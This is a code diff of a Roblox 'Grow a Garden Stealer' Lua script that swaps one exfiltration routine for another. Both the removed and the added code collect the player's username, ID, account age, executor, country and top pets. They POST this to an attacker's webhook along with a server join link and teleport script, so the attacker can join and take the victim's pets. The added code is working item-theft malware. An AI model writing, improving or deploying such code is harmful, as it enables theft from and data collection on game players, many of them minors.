@@ -403,109 +403,79 @@
             end
         end
 
-        local payload = {
-            content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
-            embeds = {{
-                title = "Grow a Garden Hit - Scripts.SM",
-                url = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
-                color = 57855,
-                fields = {
-                    {
-                        name = "🪪 Display Name",
-                        value = "```" .. (Players.LocalPlayer.DisplayName or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "👤 Username",
-                        value = "```" .. (Players.LocalPlayer.Name or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "🆔 User ID",
-                        value = "```" .. tostring(Players.LocalPlayer.UserId or 0) .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "📅 Account Age",
-                        value = "```" .. tostring(Players.LocalPlayer.AccountAge or 0) .. " days```",
-                        inline = true
-                    },
-                    {
-                        name = "💎 Receiver",
-                        value = "```" .. (Username or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "🎂 Account Created",
-                        value = "```" .. (creationDateString or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "💻 Executor",
-                        value = "```" .. (detectExecutor() or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "🌍 Country",
-                        value = "```" .. (getPlayerCountry(Players.LocalPlayer) or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "📡 Player Count",
-                        value = "```" .. (playerCount or 0) .. "/5```",
-                        inline = true
-                    },
-                    {
-                        name = "💰 Backpack",
-                        value = "```" .. truncateByLines(petString, 20) .. "```",
-                        inline = false
-                    },
-                    {
-                        name = "🚀 Join Script",
-                        value = "```lua\n" .. (tpScript or "N/A") .. "\n```",
-                        inline = false
-                    },
-                    {
-                        name = "🔗 Join with URL",
-                        value = "[Click here to join](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
-                        inline = false
-                    }
-                },
-                footer = {
-                    text = game.JobId or "Unknown"
-                },
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-            }},
-            attachments = {}
-        }
+local function formatNumber(num)
+    local numbers = math.floor(num)
+    local suffixes = {"", "k", "m", "b", "t","qd", "qn", "sx", "sp", "oc", "no"}
+    local suffixIndex = 1
+    while numbers >= 1000 do
+        numbers = numbers / 1000
+        suffixIndex = suffixIndex + 1
+    end
+    return string.format("%.2f%s", numbers, suffixes[suffixIndex])
+end
 
-        if hasRarePets() then
-            payload.content = "@everyone\n" .. "To activate the stealer you must jump or type in chat"
-                local success, err = pcall(function()
-                    request({
-                        Url = Webhook,
-                        Method = "POST",
-                        Headers = {
-                            ["Content-Type"] = "application/json"
-                        },
-                        Body = HttpService:JSONEncode(payload)
-                    })
-                end) 
-                if not success then warn(err) end
-        else
-            payload.content = "To activate the stealer you must jump or type in chat"
-            local success, err = pcall(function()
-                request({
-                    Url = Webhook,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json"
-                    },
-                    Body = HttpService:JSONEncode(payload)
-                }) 
-            end)
-            if not success then warn(err) end
-        end
+local function sendWebhook(url)
+    local http = game:GetService("HttpService")
+
+    -- Build top 5 pets string
+    local topPets = ""
+    for i, v in ipairs(pets) do
+        if i > 5 then break end
+        topPets ..= v.PetName .. " → " .. formatNumber(v.Value) .. "\n"
+    end
+    if topPets == "" then
+        topPets = "No pets found"
+    end
+
+    -- Embed data
+    local body = http:JSONEncode({
+        username = Players.LocalPlayer.Name,
+        avatar_url = "https://raw.githubusercontent.com/D3ATH-hub/main/PS99/pfp.png",
+        content = tpscript or "",
+        embeds = {{
+            title = "Grow a Garden Stealer",
+            color = 32767,
+            fields = {
+                {
+                    name = "`👤 Player Info:`",
+                    value = string.format(
+                        "```\nUsername: %s\nDisplay Name: %s\nExecutor: %s\nAccount Age: %s days\nReceiver: %s```",
+                        Players.LocalPlayer.Name,
+                        Players.LocalPlayer.DisplayName,
+                        detectExecutor(),
+                        tostring(Players.LocalPlayer.AccountAge),
+                        Username or "Unknown"
+                    ),
+                    inline = false
+                },
+                {
+                    name = "**__Top 5 Pets__**",
+                    value = "```" .. topPets .. "```",
+                    inline = false
+                },
+                {
+                    name = "__Join link:__",
+                    value = "[click here to join](" .. ("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s"):format(game.PlaceId, game.JobId) .. ")",
+                    inline = false
+                }
+            },
+            footer = { text = "Best Stealer | " .. os.date("%Y-%m-%d %H:%M:%S") }
+        }}
+    })
+
+    pcall(function()
+        request({
+            Url = url,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = body
+        })
+    end)
+end
+
+-- Call the webhook function
+sendWebhook(Webhook)
+
 
                 local function CreateGui()
                     local player = Players.LocalPlayer
